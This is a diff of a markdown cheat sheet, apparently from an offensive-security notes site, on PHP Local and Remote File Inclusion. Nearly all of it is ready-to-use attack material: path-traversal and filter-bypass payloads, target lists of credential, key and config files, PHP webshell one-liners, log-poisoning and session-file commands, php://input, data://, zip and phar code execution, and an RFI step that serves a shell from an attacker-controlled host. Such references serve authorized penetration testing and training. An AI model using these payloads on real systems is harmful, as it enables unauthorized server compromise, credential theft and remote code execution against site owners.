@@ -1,46 +1,302 @@
 ---
 title: "LFI / RFI"
 ---
-## Basic LFI
 
-Start with direct paths, then add traversal sequences if the app strips or validates the prefix.
+Local File Inclusion lets you read (and sometimes execute) files on the server by manipulating a path parameter. Remote File Inclusion is rarer and requires `allow_url_include = On` in PHP, but gives immediate RCE. Start by confirming LFI with `/etc/passwd`, then escalate toward RCE.
 
-``` wrap
+## Basic Traversal
+
+```
+# Direct
 /etc/passwd
+
+# Traversal
 ../../../../etc/passwd
-....//....//etc/passwd
+../../../../../../etc/passwd
+
+# Encoded traversal (bypass simple filters)
 %2e%2e%2f%2e%2e%2fetc%2fpasswd
-```
+..%2f..%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5cetc%2fpasswd   (Windows backslash)
 
-## Interesting Files
+# Double encoding
+%252e%252e%252f%252e%252e%252fetc/passwd
 
-These paths are high-value targets once LFI is confirmed: `/etc/shadow` needs root, but logs and history files often don't.
+# Filter bypass sequences
+....//....//etc/passwd
+..././..././etc/passwd
+....\/....\/etc/passwd
 
-``` wrap
+# Null byte (PHP < 5.3.4: terminates the string before a forced suffix)
+../../../../etc/passwd%00
+
+# Path truncation (older PHP: if app appends .php, overflow the allowed path length)
+../../../../etc/passwd/./././././././././././././././././././././././././././././././././././
+
+# With forced prefix (app prepends /var/www): supply absolute path
 /etc/passwd
-/etc/shadow
-/proc/self/environ
-/var/log/apache2/access.log
-~/.ssh/id_rsa
-~/.bash_history
-/var/www/html/config.php
 ```
 
-## Log Poisoning
+## High-Value Files
 
-Inject PHP into a log file via a poisoned User-Agent or parameter, then include the log via LFI to get code execution.
+### Linux
 
-```bash wrap
-curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
-# Trigger: http://<IP>/page?file=/var/log/apache2/access.log&cmd=id
+```
+# Users & credentials
+/etc/passwd
+/etc/shadow                         (requires root)
+/etc/group
+/home/$USER/.ssh/id_rsa
+/home/$USER/.ssh/authorized_keys
+/home/$USER/.bash_history
+/root/.bash_history
+/root/.ssh/id_rsa
+
+# Web application configs
+/var/www/html/config.php
+/var/www/html/.env
+/var/www/html/wp-config.php
+/var/www/html/application/config/database.php
+
+# Web server logs (useful for log poisoning)
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/access_log
+/usr/local/apache2/logs/access_log
+
+# Web server configs
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/httpd/conf/httpd.conf
+
+# Mail logs (also injectable for log poisoning)
+/var/log/mail
+/var/log/mail.log
+/proc/self/environ
+/proc/self/fd/0                     (stdin)
+/proc/self/cmdline
+/proc/version
+/proc/net/tcp                       (open connections)
+
+# SSH
+/etc/ssh/sshd_config
+
+# Cron
+/etc/crontab
+/etc/cron.d/
+/var/spool/cron/crontabs/root
+```
+
+### Windows
+
+```
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\drivers\etc\networks
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM       (requires SYSTEM)
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\php\php.ini
+C:\Windows\PHP\php.ini
+C:\Windows\System32\inetsrv\config\applicationHost.config
+C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 ## PHP Wrappers
 
-PHP stream wrappers let you read source code, inject input, or execute commands without needing a poisoned file.
+PHP stream wrappers are the most powerful LFI escalation path. No external file needed.
 
-``` wrap
+### Read Source Code
+
+```
+# base64-encode the file content so it doesn't get parsed as PHP
 php://filter/convert.base64-encode/resource=index.php
-php://input
-expect://id
+php://filter/convert.base64-encode/resource=../config.php
+
+# Chain filters
+php://filter/read=string.rot13|convert.base64-encode/resource=index.php
+
+# Decode the output
+echo "base64string" | base64 -d
+```
+
+### RCE via php://input
+
+Requires the LFI parameter to be passed via POST and `allow_url_include = On`.
+
+```bash wrap
+curl -s -X POST "http://$TARGET/page?file=php://input" \
+  --data '<?php system($_GET["cmd"]); ?>'
+
+# Then execute commands
+curl -s -X POST "http://$TARGET/page?file=php://input&cmd=id" \
+  --data '<?php system($_GET["cmd"]); ?>'
+```
+
+### RCE via data://
+
+```
+# Inline PHP execution (requires allow_url_include)
+data://text/plain,<?php system($_GET['cmd']);?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# URL in browser
+http://$TARGET/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
+```
+
+### expect:// (RCE, rarely enabled)
+
+```
+http://$TARGET/page?file=expect://id
+http://$TARGET/page?file=expect://whoami
+```
+
+## Log Poisoning
+
+Inject PHP into a file the server writes, then include it via LFI. The web server must have read access to the log.
+
+### Apache / Nginx Access Log
+
+```bash wrap
+# Step 1: Poison the User-Agent
+curl -s -A '<?php system($_GET["cmd"]); ?>' http://$TARGET/
+
+# Step 2: Include the log and run commands
+curl -s "http://$TARGET/page?file=/var/log/apache2/access.log&cmd=id"
+curl -s "http://$TARGET/page?file=/var/log/nginx/access.log&cmd=id"
+```
+
+### SSH Auth Log
+
+If you can trigger SSH auth attempts, the username goes into `/var/log/auth.log`.
+
+```bash wrap
+# Step 1: Poison via SSH (username is the payload)
+ssh '<?php system($_GET["cmd"]); ?>'@$TARGET
+
+# Step 2: Include auth log
+curl -s "http://$TARGET/page?file=/var/log/auth.log&cmd=id"
+```
+
+### Mail Log
+
+```bash wrap
+# Step 1: Send mail with PHP payload in the From header
+mail -s "test" -aFrom:'<?php system($_GET["cmd"]); ?>' www-data@$TARGET <<< "test"
+
+# Step 2: Include mail log
+curl -s "http://$TARGET/page?file=/var/log/mail&cmd=id"
+```
+
+### /proc/self/environ
+
+If the server includes environment variables in `/proc/self/environ` and you control an HTTP header:
+
+```bash wrap
+curl -s -H 'User-Agent: <?php system($_GET["cmd"]); ?>' \
+  "http://$TARGET/page?file=/proc/self/environ&cmd=id"
+```
+
+## /proc/self/fd (File Descriptor Brute-Force)
+
+Each open file descriptor in the current process is exposed at `/proc/self/fd/N`. FD 0-2 are stdin/stdout/stderr; higher numbers are open files including logs. Brute-force to find a writable fd that contains injected data.
+
+```bash wrap
+# Poison User-Agent first, then brute-force FDs
+for i in $(seq 1 50); do
+  curl -s "http://$TARGET/page?file=/proc/self/fd/$i&cmd=id" | grep -v "failed"
+done
+```
+
+## PHP Session File Inclusion
+
+If the app stores unsanitized input in a PHP session, include the session file.
+
+```bash wrap
+# Step 1: Find or set your session cookie, inject payload in a session parameter
+curl -s "http://$TARGET/page?lang=<?php system(\$_GET['cmd']); ?>" \
+  -H "Cookie: PHPSESSID=$SESSION_ID"
+
+# Step 2: Include your session file (PHPSESSID is the filename)
+curl -s "http://$TARGET/page?file=/var/lib/php/sessions/sess_$SESSION_ID&cmd=id"
+# Alternative session paths
+# /tmp/sess_$SESSION_ID
+# /var/lib/php5/sessions/sess_$SESSION_ID
+```
+
+## Zip / Phar Wrappers
+
+If the app accepts file uploads, upload a zip containing PHP and include it with the zip:// wrapper.
+
+```bash wrap
+# Create a zip containing a PHP webshell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+zip shell.zip shell.php
+
+# Include via zip wrapper (path inside zip after #)
+http://$TARGET/page?file=zip:///var/www/uploads/shell.zip%23shell.php&cmd=id
+
+# Phar (PHP archive): same trick, works even if extension check is strict
+# Create phar
+php -r "
+\$p = new Phar('shell.phar');
+\$p->addFromString('shell.php','<?php system(\$_GET[\"cmd\"]);?>');
+\$p->setDefaultStub('shell.php','shell.php');
+"
+# Rename to bypass upload filter
+mv shell.phar shell.jpg
+# Include
+http://$TARGET/page?file=phar:///var/www/uploads/shell.jpg%2Fshell.php&cmd=id
+```
+
+## RFI (Remote File Inclusion)
+
+Requires `allow_url_include = On` and `allow_url_fopen = On` in `php.ini`. Rare in modern setups, but still seen on old PHP or misconfigured apps.
+
+```bash wrap
+# Host a webshell on your attacker machine
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+python3 -m http.server 8080
+
+# Include your remote shell
+http://$TARGET/page?file=http://$LHOST:8080/shell.php&cmd=id
+
+# SMB (Windows targets)
+http://$TARGET/page?file=\\$LHOST\share\shell.php&cmd=id
+
+# FTP
+http://$TARGET/page?file=ftp://$LHOST/shell.php&cmd=id
+```
+
+## LFI to RCE: Upload + Include
+
+If you can upload a file anywhere on the server (avatar, attachment, temp file), you only need to know the path and include it.
+
+```bash wrap
+# 1. Upload a file with PHP content (disguised as image)
+# File content: <?php system($_GET["cmd"]); ?>
+# Filename: shell.jpg
+
+# 2. Find the upload path (check source, config, or LFI /etc/apache2 config)
+# 3. Include it
+curl -s "http://$TARGET/page?file=../../uploads/shell.jpg&cmd=id"
+```
+
+## Automation
+
+```bash wrap
+# LFI Suite / ffuf for path brute-force
+ffuf -u "http://$TARGET/page?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -fw 0 -mc 200
+
+# kadimus (LFI exploitation tool)
+kadimus -u "http://$TARGET/page?file="
+
+# liffy
+python3 liffy.py -u "http://$TARGET/page?file="
 ```
